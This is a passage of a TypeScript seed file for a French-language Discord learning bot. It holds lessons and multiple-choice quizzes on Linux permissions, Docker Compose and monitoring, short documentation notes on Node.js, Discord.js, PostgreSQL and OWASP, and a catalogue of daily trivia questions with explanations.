              "Il fait exécuter le programme avec les privilèges de son PROPRIÉTAIRE, peu importe qui le lance",
              "Il empêche toute exécution du fichier",
              "Il rend le fichier invisible dans `ls`",
            ],
            correctIndex: 1,
            explanation:
              "SUID est puissant et dangereux si mal maîtrisé : un binaire SUID appartenant à root exécute son code avec les privilèges root, même lancé par un utilisateur normal — une mauvaise implémentation ouvre une voie d'élévation de privilèges.",
          },
          {
            order: 2,
            prompt: "À quoi sert le bit sticky sur un dossier comme `/tmp` ?",
            choices: [
              "À empêcher toute création de fichier dans le dossier",
              "À empêcher un utilisateur de supprimer les fichiers appartenant à un autre utilisateur dans ce dossier partagé, même avec un accès en écriture au dossier",
              "À chiffrer tous les fichiers du dossier",
              "À rendre le dossier accessible uniquement à root",
            ],
            correctIndex: 1,
            explanation:
              "Sans le bit sticky, un accès en écriture au dossier suffirait techniquement à supprimer les fichiers de n'importe qui d'autre dedans — le sticky bit restreint la suppression au seul propriétaire du fichier (ou root), même dans un dossier partagé en écriture par tous comme `/tmp`.",
          },
        ],
      },
    ],
  },
  {
    key: "devops-docker-compose-monitoring",
    title: "DevOps avancé : Docker Compose et Monitoring",
    description: "Orchestrer plusieurs conteneurs ensemble avec Docker Compose, et savoir observer un système en production (logs, métriques, alerting).",
    category: "CLOUD",
    skillKey: "cicd",
    level: 3,
    prerequisiteCourseKeys: ["docker-basics", "devops-cicd"],
    lessons: [
      {
        order: 1,
        title: "Docker Compose : orchestrer plusieurs conteneurs",
        content:
          "La plupart des applications réelles ne tournent pas dans un seul conteneur isolé — une app web a typiquement besoin d'une base de données, d'un cache, parfois d'un reverse proxy. **Docker Compose** décrit tous ces services dans un seul fichier `docker-compose.yml` et les démarre/arrête ensemble.\n\n" +
          "```yaml\nservices:\n  app:\n    build: .\n    ports: [\"3000:3000\"]\n    depends_on: [db]\n  db:\n    image: postgres:16\n    environment:\n      POSTGRES_PASSWORD: secret\n    volumes:\n      - db-data:/var/lib/postgresql/data\nvolumes:\n  db-data:\n```\n\n" +
          "`docker compose up` démarre tous les services définis, dans l'ordre indiqué par `depends_on` ; `docker compose down` les arrête. Les services communiquent entre eux par leur nom (`app` peut se connecter à `db:5432` directement, Compose crée un réseau interne automatiquement) — pas besoin de connaître une IP.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi utiliser Docker Compose plutôt que de lancer chaque conteneur manuellement avec `docker run` ?",
            choices: [
              "Compose est obligatoire pour utiliser Docker",
              "Compose décrit et orchestre plusieurs services liés (app + DB + cache...) dans un seul fichier, démarrés/arrêtés ensemble de façon cohérente",
              "Compose remplace complètement le besoin de Dockerfile",
              "Compose ne fonctionne qu'en production, jamais en développement",
            ],
            correctIndex: 1,
            explanation:
              "Sans Compose, il faudrait lancer et connecter manuellement chaque conteneur (réseau, ordre de démarrage, variables partagées) — Compose déclare toute cette topologie une seule fois dans un fichier versionné.",
          },
          {
            order: 2,
            prompt: "Comment le service `app` peut-il se connecter au service `db` dans un fichier Compose ?",
            choices: [
              "Il doit connaître l'adresse IP exacte du conteneur, qui change à chaque redémarrage",
              "Directement par le nom du service (`db`), Compose crée un réseau interne qui résout ce nom automatiquement",
              "C'est impossible, chaque conteneur est totalement isolé",
              "Uniquement via une adresse publique sur internet",
            ],
            correctIndex: 1,
            explanation:
              "Compose crée un réseau Docker dédié où chaque service est joignable par son nom déclaré dans le fichier — une résolution DNS interne automatique, sans avoir à gérer des IP qui changeraient à chaque redémarrage.",
          },
        ],
      },
      {
        order: 2,
        title: "Logs : centraliser pour comprendre",
        content:
          "Sur un système avec plusieurs services/conteneurs, chercher une erreur en se connectant manuellement à chaque machine devient vite ingérable. La **centralisation des logs** regroupe tous les logs de tous les composants dans un système unique, interrogeable.\n\n" +
          "Un bon log structuré (JSON plutôt que du texte libre) facilite énormément la recherche et l'agrégation automatisée : `{\"level\":\"error\",\"service\":\"api\",\"userId\":\"42\",\"message\":\"payment failed\",\"timestamp\":\"...\"}` peut être filtré/agrégé par n'importe quel champ, contrairement à une ligne de texte libre où il faut parser manuellement.\n\n" +
          "Les niveaux de log (`debug` < `info` < `warn` < `error` < `fatal`) permettent de filtrer le bruit selon le contexte : en développement on veut souvent tout voir (`debug`), en production on ne veut typiquement voir que `warn` et au-dessus pour ne pas noyer les vrais signaux dans du bruit informatif.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi un log structuré (JSON) est-il préférable à un simple message texte libre en production ?",
            choices: [
              "Il prend moins de place sur le disque",
              "Il permet de filtrer et d'agréger automatiquement par champ (service, niveau, userId...) sans avoir à parser manuellement du texte libre",
              "Il n'a aucun avantage réel par rapport au texte libre",
              "Il est obligatoire pour que les logs s'affichent dans la console",
            ],
            correctIndex: 1,
            explanation:
              "Un champ structuré (`{\"level\":\"error\", ...}`) est directement interrogeable par un outil d'agrégation de logs — un message texte libre nécessite un parsing fragile (regex) pour extraire la même information.",
          },
          {
            order: 2,
            prompt: "Pourquoi limiter les logs affichés en production à `warn` et au-dessus, plutôt que tout afficher comme en développement ?",
            choices: [
              "Ce n'est jamais recommandé, il faut toujours tout logger en production",
              "Trop de logs `debug`/`info` en production noient les signaux vraiment importants dans le bruit, rendant le diagnostic plus difficile",
              "Les logs `debug` ne fonctionnent pas en production",
              "Ça n'a aucun rapport avec la lisibilité des logs",
            ],
            correctIndex: 1,
            explanation:
              "Un volume excessif de logs informatifs noie les erreurs réelles — filtrer par niveau adapté au contexte (moins verbeux en production) garde les logs exploitables pour un vrai diagnostic.",
          },
        ],
      },
      {
        order: 3,
        title: "Métriques et alerting",
        content:
          "Contrairement aux logs (événements discrets, souvent riches en contexte), les **métriques** sont des mesures numériques suivies dans le temps (CPU %, temps de réponse moyen, nombre de requêtes/seconde, taux d'erreur) — moins détaillées individuellement, mais bien plus efficaces pour repérer une tendance ou déclencher une alerte automatique.\n\n" +
          "Un système d'**alerting** surveille ces métriques et notifie une équipe quand un seuil anormal est franchi (ex: « taux d'erreur > 5% pendant 5 minutes »). Une bonne alerte doit être **actionnable** : signaler un problème sur lequel quelqu'un peut réellement agir, pas juste informer — trop d'alertes non actionnables mènent à la même fatigue d'alerte que dans un SIEM mal réglé (voir le cours Blue Team).\n\n" +
          "Les tableaux de bord (dashboards) combinent ces métriques pour donner une vue d'ensemble en temps réel de la santé d'un système — utiles pour un diagnostic visuel rapide, complémentaires aux logs pour l'investigation détaillée d'un incident précis.",
        xpReward: 30,
        questions: [
          {
            order: 1,
            prompt: "Quelle est la différence principale entre un log et une métrique ?",
            choices: [
              "Ce sont des synonymes exacts",
              "Un log est un événement discret riche en contexte ; une métrique est une mesure numérique suivie dans le temps, plus efficace pour détecter une tendance",
              "Les métriques ne peuvent pas être visualisées dans un dashboard",
              "Les logs ne peuvent jamais déclencher d'alerte",
            ],
            correctIndex: 1,
            explanation:
              "Les logs racontent ce qui s'est précisément passé (utile pour investiguer un incident) ; les métriques quantifient une tendance dans le temps (utile pour surveiller la santé globale et déclencher des alertes automatiques).",
          },
          {
            order: 2,
            prompt: "Que signifie qu'une alerte doit être « actionnable » ?",
            choices: [
              "Elle doit contenir un maximum d'informations techniques",
              "Elle doit signaler un problème réel sur lequel quelqu'un peut concrètement agir — pas juste informer sans conséquence pratique",
              "Elle doit s'envoyer automatiquement toutes les heures",
              "Elle doit toujours être envoyée à toute l'équipe sans exception",
            ],
            correctIndex: 1,
            explanation:
              "Une alerte qui ne mène à aucune action concrète possible n'est que du bruit — elle finit ignorée, exactement comme des règles de détection trop sensibles dans un SIEM, créant une fatigue d'alerte dangereuse.",
          },
        ],
      },
    ],
  },
];

/**
 * Corpus documentaire (Phase 6) — extraits rédigés à la main, pas copiés
 * depuis les sites sources. Retrieval par mots-clés (voir docsService.ts),
 * pas d'embeddings (Anthropic n'expose pas d'API d'embeddings publique).
 */
interface DocChunkSeed {
  source: string;
  title: string;
  url: string;
  content: string;
}

const DOC_CHUNKS: DocChunkSeed[] = [
  {
    source: "Node.js",
    title: "require vs import",
    url: "https://nodejs.org/api/esm.html",
    content:
      "require() (CommonJS) est synchrone et historique ; import (ESM, ECMAScript Modules) est la syntaxe standard moderne, asynchrone au chargement. Pour utiliser import/export dans un projet Node, ajoute `\"type\": \"module\"` dans package.json (ou utilise l'extension .mjs). Mélanger les deux dans le même fichier ne fonctionne pas : un module ESM ne peut pas utiliser require() directement (il existe des contournements comme createRequire, mais mieux vaut rester cohérent sur un seul système par projet).",
  },
  {
    source: "Node.js",
    title: "Gérer les erreurs asynchrones non catchées",
    url: "https://nodejs.org/api/process.html#event-unhandledrejection",
    content:
      "Une Promise rejetée sans .catch() ni try/catch autour d'un await déclenche l'event 'unhandledRejection' sur process, plutôt qu'un try/catch classique qui ne l'attrape pas. En production, il faut écouter cet event pour logger l'erreur (voir src/index.ts de Nodify) — sans ça, l'erreur est silencieuse ou fait planter le process selon la version de Node.",
  },
  {
    source: "Node.js",
    title: "Streams pour les gros fichiers",
    url: "https://nodejs.org/api/stream.html",
    content:
      "fs.readFileSync() charge un fichier entier en mémoire avant de continuer — problématique sur un gros fichier (RAM, latence). Un stream (fs.createReadStream) traite les données par petits morceaux (chunks) au fur et à mesure qu'ils arrivent, avec un mécanisme de backpressure qui ralentit automatiquement la lecture si le consommateur est plus lent que la source. À privilégier pour tout fichier dont la taille n'est pas garantie petite.",
  },
  {
    source: "Discord.js",
    title: "Quels Gateway Intents activer",
    url: "https://discordjs.guide/popular-topics/intents.html",
    content:
      "Les Gateway Intents déterminent quels events Discord envoie à ton bot. N'active que ceux dont tu as réellement besoin (ex: Nodify n'active que GatewayIntentBits.Guilds en Phase 1) : moins d'intents = moins de trafic réseau et de charge mémoire côté client. Certains intents sont \"privilégiés\" (ex: MessageContent, GuildMembers) et doivent être activés manuellement dans le Discord Developer Portal en plus d'être déclarés dans le code, sinon la connexion échoue.",
  },
  {
    source: "Discord.js",
    title: "Différer une réponse longue (deferReply)",
    url: "https://discordjs.guide/slash-commands/response-methods.html",
    content:
      "Discord invalide une interaction si elle ne reçoit pas de réponse dans les 3 secondes. Si une commande doit faire un traitement plus long (appel IA, requête DB lourde...), il faut appeler interaction.deferReply() immédiatement (ça affiche \"Nodify réfléchit...\" et donne 15 minutes de plus), puis interaction.editReply() une fois le résultat prêt — c'est ce que font /explainme et /securityreview dans Nodify.",
  },
  {
    source: "Discord.js",
    title: "Limites des Embeds Discord",
    url: "https://discordjs.guide/popular-topics/embeds.html",
    content:
      "Un embed Discord a des limites strictes : 256 caractères pour le titre, 4096 pour la description, 25 fields maximum, 1024 caractères par valeur de field, et 6000 caractères au total pour tout l'embed cumulé. Dépasser une limite fait échouer l'envoi avec une erreur — il faut tronquer ou paginer le contenu généré dynamiquement (ex: une réponse IA très longue) avant de construire l'embed.",
  },
  {
    source: "PostgreSQL",
    title: "Quand ajouter un index",
    url: "https://www.postgresql.org/docs/current/indexes.html",
    content:
      "Un index (B-tree par défaut) accélère les recherches sur une colonne utilisée dans une clause WHERE, JOIN ou ORDER BY, en évitant un scan complet de la table. Mais un index n'est pas gratuit : chaque écriture (INSERT/UPDATE/DELETE) doit aussi mettre à jour tous les index de la table, donc indexer une colonne rarement filtrée ralentit les écritures pour un gain de lecture qui n'arrivera jamais. Prisma crée automatiquement un index sur les clés uniques et les clés étrangères.",
  },
  {
    source: "PostgreSQL",
    title: "Lire un plan avec EXPLAIN ANALYZE",
    url: "https://www.postgresql.org/docs/current/using-explain.html",
    content:
      "EXPLAIN ANALYZE <requête> exécute réellement la requête et affiche le plan choisi par l'optimiseur ainsi que le temps réel de chaque étape. Un \"Seq Scan\" (scan séquentiel) sur une grosse table dans les lignes coûteuses du plan indique souvent qu'un index manquant permettrait un \"Index Scan\" bien plus rapide. C'est l'outil de diagnostic de référence avant d'ajouter un index au hasard.",
  },
  {
    source: "OWASP",
    title: "Qu'est-ce que le Top 10",
    url: "https://owasp.org/www-project-top-ten/",
    content:
      "L'OWASP Top 10 liste les 10 catégories de risques de sécurité web jugées les plus critiques par la communauté, mise à jour tous les quelques années (dernière édition stable : 2021). Ce n'est ni une checklist exhaustive ni une certification — c'est un point de départ pour prioriser les risques les plus courants et les plus impactants en premier, pas une garantie de sécurité totale si tous les points sont cochés.",
  },
  {
    source: "OWASP",
    title: "Broken Access Control (A01:2021)",
    url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
    content:
      "Broken Access Control est la catégorie n°1 du Top 10 2021 : un utilisateur peut accéder à des ressources ou actions au-delà de ses permissions prévues. Exemple classique : IDOR (Insecure Direct Object Reference) — changer l'ID dans /api/orders/1234 en /api/orders/1235 et accéder à la commande de quelqu'un d'autre parce que le serveur ne revérifie pas que la ressource appartient bien à l'utilisateur authentifié. La défense fiable est de toujours revérifier les permissions côté serveur à chaque requête, jamais seulement côté client.",
  },
];

/**
 * Question du jour — catalogue statique rédigé à la main (pas de génération
 * IA à la volée, pour éviter une question factuellement fausse). Postée
 * automatiquement dans le salon hub (voir src/community/dailyQuestionService.ts).
 */
interface DailyQuestionSeed {
  key: string;
  category: SkillCategory;
  prompt: string;
  choices: string[];
  correctIndex: number;
  explanation: string;
}

const DAILY_QUESTIONS: DailyQuestionSeed[] = [
  {
    key: "typeof-null",
    category: "DEVELOPMENT",
    prompt: "En JavaScript, que retourne `typeof null` ?",
    choices: ["\"null\"", "\"undefined\"", "\"object\"", "\"number\""],
    correctIndex: 2,
    explanation:
      "C'est un bug historique du langage conservé pour la compatibilité : `typeof null` retourne `\"object\"`, alors que `null` n'est pas un objet.",
  },
  {
    key: "git-reset-soft",
    category: "DEVELOPMENT",
    prompt:
      "Quelle commande Git annule le dernier commit tout en gardant les modifications indexées (prêtes à recommit) ?",
    choices: [
      "git reset --hard HEAD~1",
      "git reset --soft HEAD~1",
      "git revert HEAD",
      "git checkout HEAD~1",
    ],
    correctIndex: 1,
    explanation:
      "`--soft` déplace juste le pointeur de branche, en gardant les changements dans la zone d'index (stagés). `--hard` les supprimerait complètement, `--mixed` (par défaut) les garderait mais désindexés.",
  },
  {
    key: "https-port",
    category: "NETWORKING",
    prompt: "Quel port HTTPS utilise-t-il par défaut ?",
    choices: ["21", "80", "443", "8080"],
    correctIndex: 2,
    explanation: "HTTPS utilise le port 443 par défaut ; HTTP (non chiffré) utilise le port 80.",
  },
  {
    key: "dns-acronym",
    category: "NETWORKING",
    prompt: "Que signifie l'acronyme DNS ?",
    choices: [
      "Dynamic Network Service",
      "Domain Name System",
      "Data Node Server",
      "Digital Naming Standard",
    ],
    correctIndex: 1,
    explanation: "DNS = Domain Name System, le service qui traduit les noms de domaine en IP.",
  },
  {
    key: "llm-acronym",
    category: "AI",
    prompt: "Que signifie l'acronyme LLM ?",
    choices: [
      "Large Language Model",
      "Long Learning Machine",
      "Linear Logic Model",
      "Local Language Module",
    ],
    correctIndex: 0,
    explanation: "LLM = Large Language Model, un modèle de langage entraîné sur d'énormes volumes de texte.",
  },
  {
    key: "linux-top",
    category: "SYSTEMS",
    prompt:
      "Sous Linux, quelle commande affiche les processus en cours d'exécution en temps réel ?",
    choices: ["ls", "top", "cat", "chmod"],
    correctIndex: 1,
    explanation:
      "`top` affiche un tableau de bord des processus en temps réel (CPU, mémoire...). `ls` liste des fichiers, `chmod` change des permissions.",
  },
  {
    key: "sql-having",
    category: "DEVELOPMENT",
    prompt: "En SQL, quelle clause filtre les résultats APRÈS un GROUP BY ?",
    choices: ["WHERE", "HAVING", "FILTER", "ORDER BY"],
    correctIndex: 1,
    explanation:
      "WHERE filtre les lignes AVANT le regroupement ; HAVING filtre les groupes APRÈS le GROUP BY (ex: HAVING COUNT(*) > 5).",
  },
  {
    key: "mitm-attack",
    category: "CYBERSECURITY",
    prompt:
      "Quel type d'attaque consiste à intercepter les communications entre deux parties sans qu'elles le sachent ?",
    choices: ["DDoS", "Man-in-the-Middle", "Brute force", "Cross-Site Scripting"],
    correctIndex: 1,
    explanation:
      "Le Man-in-the-Middle (MITM) place l'attaquant entre les deux parties, capable de lire voire modifier les échanges à leur insu.",
  },
  {
    key: "docker-ps",
    category: "CLOUD",
    prompt: "Quelle commande Docker liste les conteneurs en cours d'exécution ?",
    choices: ["docker images", "docker ps", "docker run", "docker build"],
    correctIndex: 1,
    explanation:
      "`docker ps` liste les conteneurs actifs. `docker images` liste les images, `docker run` en lance un nouveau, `docker build` en construit une.",
  },
  {
    key: "array-map-immutable",
    category: "DEVELOPMENT",
    prompt: "Quelle méthode de tableau JavaScript ne modifie PAS le tableau original ?",
    choices: ["push", "splice", "map", "sort"],
    correctIndex: 2,
    explanation:
      "`map` retourne un nouveau tableau sans toucher à l'original. `push`, `splice` et `sort` modifient tous le tableau en place.",
  },

  // --- Lot 2 : 140 questions supplémentaires (25 par catégorie) ----------

  // DEVELOPMENT
  {
    key: "js-strict-equality",
    category: "DEVELOPMENT",
    prompt: "Quel opérateur JavaScript compare valeur ET type, sans conversion implicite ?",
    choices: ["==", "===", "=", "!="],
    correctIndex: 1,
    explanation: "`===` compare valeur et type sans conversion. `==` convertit les types avant de comparer, ce qui cause des surprises (`'1' == 1` est vrai).",
  },
  {
    key: "python-indentation",
    category: "DEVELOPMENT",
    prompt: "En Python, comment délimite-t-on un bloc de code (dans un if, une fonction...) ?",
    choices: ["Avec des accolades { }", "Avec l'indentation", "Avec des mots-clés begin/end", "Avec des points-virgules"],
    correctIndex: 1,
    explanation: "L'indentation fait partie de la syntaxe Python — pas juste une convention de style comme dans d'autres langages.",
  },
  {
    key: "git-clone-vs-fork",
    category: "DEVELOPMENT",
    prompt: "Quelle est la différence entre `git clone` et un fork (sur GitHub) ?",
    choices: ["Aucune différence", "clone copie un dépôt en local, fork crée une copie du dépôt sur son propre compte GitHub", "fork est juste plus rapide", "clone ne fonctionne que sur les dépôts privés"],
    correctIndex: 1,
    explanation: "clone télécharge le dépôt sur ta machine ; fork est une fonctionnalité GitHub qui crée une copie indépendante du dépôt sur ton compte, souvent pour ensuite proposer des changements via Pull Request.",
  },
  {
    key: "css-specificity",
    category: "DEVELOPMENT",
    prompt: "En CSS, lequel de ces sélecteurs a la priorité (spécificité) la plus élevée ?",
    choices: ["Un sélecteur de balise (div)", "Une classe (.ma-classe)", "Un ID (#mon-id)", "Un style inline (style=\"...\")"],
    correctIndex: 3,
    explanation: "Ordre de spécificité croissante : balise < classe < ID < style inline (en ignorant `!important`, qui prime sur tout).",
  },
  {
    key: "html-semantic-nav",
    category: "DEVELOPMENT",
    prompt: "Quelle balise HTML est sémantiquement correcte pour une barre de navigation ?",
    choices: ["<div class=\"nav\">", "<nav>", "<navigation>", "<menu>"],
    correctIndex: 1,
    explanation: "`<nav>` est une balise sémantique HTML5 dédiée à la navigation, utile pour l'accessibilité et le référencement.",
  },
  {
    key: "js-var-let-scope",
    category: "DEVELOPMENT",
    prompt: "Quelle est la principale différence entre `let` et `var` en JavaScript ?",
    choices: ["Aucune, ce sont des synonymes", "`let` a une portée de bloc, `var` a une portée de fonction", "`var` est plus récent que `let`", "`let` ne peut jamais être réassigné"],
    correctIndex: 1,
    explanation: "`var` \"fuit\" hors des blocs `{ }` (portée de fonction), une source classique de bugs — `let`/`const` restent bien confinés au bloc.",
  },
  {
    key: "rest-http-post",
    category: "DEVELOPMENT",
    prompt: "Quel verbe HTTP est conventionnellement utilisé pour CRÉER une ressource dans une API REST ?",
    choices: ["GET", "POST", "DELETE", "HEAD"],
    correctIndex: 1,
    explanation: "POST crée une nouvelle ressource. GET lit, PUT/PATCH modifient, DELETE supprime.",
  },
  {
    key: "python-list-comprehension",
    category: "DEVELOPMENT",
    prompt: "Que retourne `[x*2 for x in range(5)]` en Python ?",
    choices: ["[0, 2, 4, 6, 8]", "[1, 2, 3, 4, 5]", "[0, 1, 2, 3, 4]", "Une erreur de syntaxe"],
    correctIndex: 0,
    explanation: "`range(5)` donne 0,1,2,3,4 ; chaque valeur est multipliée par 2, donnant [0,2,4,6,8].",
  },
  {
    key: "sql-join-inner",
    category: "DEVELOPMENT",
    prompt: "Quel type de JOIN SQL retourne uniquement les lignes ayant une correspondance dans les DEUX tables ?",
    choices: ["LEFT JOIN", "RIGHT JOIN", "INNER JOIN", "FULL OUTER JOIN"],
    correctIndex: 2,
    explanation: "INNER JOIN ne garde que les lignes où la condition de jointure trouve une correspondance des deux côtés.",
  },
  {
    key: "js-arrow-this",
    category: "DEVELOPMENT",
    prompt: "Dans une fonction fléchée JavaScript (`=>`), à quoi correspond `this` ?",
    choices: ["À l'objet qui appelle la fonction", "Au `this` du contexte lexical englobant (hérité)", "Toujours à `undefined`", "À l'objet global uniquement"],
    correctIndex: 1,
    explanation: "Contrairement à une fonction classique, une fonction fléchée n'a pas son propre `this` : elle hérite de celui de son environnement de définition.",
  },
  {
    key: "npm-vs-npx",
    category: "DEVELOPMENT",
    prompt: "Quelle est la différence entre `npm` et `npx` ?",
    choices: ["Aucune", "npm installe des paquets, npx exécute un paquet sans forcément l'installer globalement", "npx est un synonyme de npm install", "npm est plus récent que npx"],
    correctIndex: 1,
    explanation: "`npx create-react-app` télécharge et exécute l'outil à la volée sans polluer ton système avec une installation globale permanente.",
  },
  {
    key: "python-none",
    category: "DEVELOPMENT",
    prompt: "Quel mot-clé représente l'absence de valeur en Python (équivalent de `null`) ?",
    choices: ["null", "None", "nil", "undefined"],
    correctIndex: 1,
    explanation: "`None` est l'objet Python représentant l'absence de valeur — avec un N majuscule.",
  },
  {
    key: "css-box-model-order",
    category: "DEVELOPMENT",
    prompt: "Dans le modèle de boîte CSS, quel est l'ordre correct de l'intérieur vers l'extérieur ?",
    choices: ["Border, Padding, Content, Margin", "Content, Padding, Border, Margin", "Margin, Border, Padding, Content", "Content, Margin, Border, Padding"],
    correctIndex: 1,
    explanation: "Content (le contenu) → Padding (l'espacement interne) → Border (la bordure) → Margin (l'espacement externe).",
  },
  {
    key: "js-array-destructuring",
    category: "DEVELOPMENT",
    prompt: "Que fait `const [a, b] = [1, 2, 3];` en JavaScript ?",
    choices: ["Erreur car les tailles ne correspondent pas", "a vaut 1, b vaut 2, le 3 est simplement ignoré", "a et b valent tous les deux [1,2,3]", "a vaut [1,2,3], b vaut undefined"],
    correctIndex: 1,
    explanation: "La déstructuration de tableau prend les éléments dans l'ordre ; les éléments en trop sont simplement ignorés, pas d'erreur.",
  },
  {
    key: "git-gitignore",
    category: "DEVELOPMENT",
    prompt: "À quoi sert le fichier `.gitignore` ?",
    choices: ["Lister les fichiers à toujours committer en priorité", "Indiquer à Git quels fichiers/dossiers ne pas suivre (ex: node_modules, .env)", "Chiffrer le contenu du dépôt", "Définir les branches autorisées"],
    correctIndex: 1,
    explanation: "Utile pour exclure des fichiers générés, des secrets (.env) ou de grosses dépendances (node_modules) de l'historique Git.",
  },
  {
    key: "python-pip",
    category: "DEVELOPMENT",
    prompt: "Quel outil installe des paquets Python ?",
    choices: ["npm", "pip", "composer", "gem"],
    correctIndex: 1,
    explanation: "`pip install requests` installe la bibliothèque `requests`. npm est pour Node.js, composer pour PHP, gem pour Ruby.",
  },
  {
    key: "js-null-vs-undefined",
    category: "DEVELOPMENT",
    prompt: "En JavaScript, quelle est la différence entre `null` et `undefined` ?",
    choices: ["Aucune, ce sont des synonymes", "`undefined` signifie qu'une variable n'a jamais été assignée ; `null` est une absence de valeur assignée intentionnellement", "`null` est un type primitif, pas `undefined`", "`undefined` n'existe qu'en TypeScript"],
    correctIndex: 1,
    explanation: "Une variable déclarée sans valeur vaut `undefined` automatiquement ; `null` doit être assigné explicitement par le développeur pour signifier \"vide, volontairement\".",
  },
  {
    key: "sql-primary-key",
    category: "DEVELOPMENT",
    prompt: "À quoi sert une clé primaire (PRIMARY KEY) dans une table SQL ?",
    choices: ["Elle identifie de façon unique chaque ligne de la table", "Elle chiffre automatiquement les données sensibles", "Elle trie automatiquement la table", "Elle limite le nombre de colonnes autorisées"],
    correctIndex: 0,
    explanation: "Une clé primaire garantit l'unicité de chaque ligne et sert de référence pour les clés étrangères d'autres tables.",
  },
  {
    key: "css-flexbox-justify",
    category: "DEVELOPMENT",
    prompt: "En CSS Flexbox, quelle propriété centre les éléments sur l'axe PRINCIPAL du conteneur ?",
    choices: ["align-items", "justify-content", "flex-direction", "display"],
    correctIndex: 1,
    explanation: "`justify-content` agit sur l'axe principal (horizontal par défaut) ; `align-items` agit sur l'axe transversal (perpendiculaire).",
  },
  {
    key: "js-spread-operator",
    category: "DEVELOPMENT",
    prompt: "Que fait l'opérateur spread `...` sur un tableau, ex: `[...arr]` ?",
    choices: ["Supprime le tableau", "Crée une copie superficielle (shallow copy) du tableau", "Trie le tableau", "Convertit le tableau en chaîne de caractères"],
    correctIndex: 1,
    explanation: "`[...arr]` étale les éléments d'`arr` dans un nouveau tableau — pratique pour copier ou fusionner des tableaux sans muter l'original.",
  },
  {
    key: "python-fstring",
    category: "DEVELOPMENT",
    prompt: "Quelle syntaxe Python insère une variable directement dans une chaîne, ex: `f\"Bonjour {nom}\"` ?",
    choices: ["Une concaténation classique", "Une f-string", "Un template literal", "printf"],
    correctIndex: 1,
    explanation: "Le préfixe `f` avant les guillemets active l'interpolation de variables entre accolades — introduit en Python 3.6.",
  },
  {
    key: "js-typeof-function",
    category: "DEVELOPMENT",
    prompt: "Que retourne `typeof function(){}` en JavaScript ?",
    choices: ["\"object\"", "\"function\"", "\"undefined\"", "\"method\""],
    correctIndex: 1,
    explanation: "Contrairement à la plupart des objets (`typeof {} === \"object\"`), les fonctions ont leur propre valeur `typeof` distincte : `\"function\"`.",
  },
  {
    key: "sql-group-by",
    category: "DEVELOPMENT",
    prompt: "À quoi sert la clause `GROUP BY` en SQL ?",
    choices: ["Trier les résultats", "Regrouper des lignes partageant une même valeur pour appliquer des agrégations (COUNT, SUM...)", "Filtrer les lignes avant tout traitement", "Supprimer les doublons uniquement"],
    correctIndex: 1,
    explanation: "`SELECT pays, COUNT(*) FROM users GROUP BY pays` compte les utilisateurs par pays — un groupe par valeur distincte de `pays`.",
  },
  {
    key: "js-template-literal",
    category: "DEVELOPMENT",
    prompt: "En JavaScript moderne, quelle syntaxe permet d'insérer une variable dans une chaîne avec des backticks ?",
    choices: ["`Bonjour ${nom}`", "\"Bonjour \" + nom", "'Bonjour %s' % nom", "Bonjour {nom}"],
    correctIndex: 0,
    explanation: "Les template literals (backticks) avec `${...}` permettent l'interpolation directe, sans concaténation manuelle avec `+`.",
  },

  // NETWORKING
  {
    key: "osi-layers-count",
    category: "NETWORKING",
    prompt: "Combien de couches compte le modèle OSI ?",
    choices: ["5", "6", "7", "8"],
    correctIndex: 2,
    explanation: "Physique, Liaison, Réseau, Transport, Session, Présentation, Application — 7 couches au total.",
  },
  {
    key: "ip-private-range",
    category: "NETWORKING",
    prompt: "Laquelle de ces adresses IP est une adresse privée (réseau local) ?",
    choices: ["8.8.8.8", "192.168.1.1", "1.1.1.1", "172.217.10.5"],
    correctIndex: 1,
    explanation: "192.168.0.0/16 fait partie des plages privées (RFC 1918), avec 10.0.0.0/8 et 172.16.0.0/12. Les autres sont des IP publiques réelles (DNS Google/Cloudflare).",
  },
  {
    key: "http-status-404",
    category: "NETWORKING",
    prompt: "Que signifie le code de statut HTTP 404 ?",
    choices: ["Erreur serveur interne", "Ressource non trouvée", "Accès interdit", "Requête réussie"],
    correctIndex: 1,
    explanation: "404 Not Found : le serveur n'a pas trouvé de ressource correspondant à l'URL demandée.",
  },
  {
    key: "http-status-500",
    category: "NETWORKING",
    prompt: "Que signifie le code de statut HTTP 500 ?",
    choices: ["Ressource non trouvée", "Non autorisé", "Erreur interne du serveur", "Redirection"],
    correctIndex: 2,
    explanation: "500 Internal Server Error : quelque chose a mal tourné côté serveur, indépendamment de la requête du client.",
  },
  {
    key: "dhcp-role",
    category: "NETWORKING",
    prompt: "À quoi sert le protocole DHCP ?",
    choices: ["Chiffrer le trafic réseau", "Attribuer automatiquement une adresse IP à un appareil qui rejoint le réseau", "Traduire les noms de domaine en IP", "Router les emails"],
    correctIndex: 1,
    explanation: "Sans DHCP, il faudrait configurer manuellement l'adresse IP de chaque appareil qui se connecte à un réseau.",
  },
  {
    key: "subnet-mask-role",
    category: "NETWORKING",
    prompt: "À quoi sert un masque de sous-réseau (subnet mask) ?",
    choices: ["Chiffrer les paquets IP", "Délimiter quelle partie d'une adresse IP désigne le réseau et quelle partie désigne l'hôte", "Accélérer la connexion", "Bloquer des ports spécifiques"],
    correctIndex: 1,
    explanation: "Ex: 255.255.255.0 signifie que les 3 premiers octets identifient le réseau, le dernier identifie l'hôte au sein de ce réseau.",
  },
  {
    key: "mac-address-def",
    category: "NETWORKING",
    prompt: "Qu'est-ce qu'une adresse MAC ?",
    choices: ["Une adresse IP statique", "Un identifiant physique unique attribué à une carte réseau", "Un protocole de chiffrement", "Un nom de domaine"],
    correctIndex: 1,
    explanation: "Contrairement à une IP (qui peut changer), l'adresse MAC est généralement gravée dans le matériel de la carte réseau.",
  },
  {
    key: "port-ssh-default",
    category: "NETWORKING",
    prompt: "Quel port utilise SSH par défaut ?",
    choices: ["21", "22", "23", "25"],
    correctIndex: 1,
    explanation: "Port 22 pour SSH. 21 est FTP, 23 est Telnet (obsolète, non chiffré), 25 est SMTP (email).",
  },
  {
    key: "port-ftp-default",
    category: "NETWORKING",
    prompt: "Quel port utilise FTP par défaut pour le contrôle de la connexion ?",
    choices: ["20", "21", "22", "23"],
    correctIndex: 1,
    explanation: "Le port 21 gère le contrôle de la session FTP ; le port 20 est traditionnellement utilisé pour le transfert de données.",
  },
  {
    key: "dns-record-a",
    category: "NETWORKING",
    prompt: "Quel type d'enregistrement DNS associe un nom de domaine à une adresse IPv4 ?",
    choices: ["MX", "CNAME", "A", "TXT"],
    correctIndex: 2,
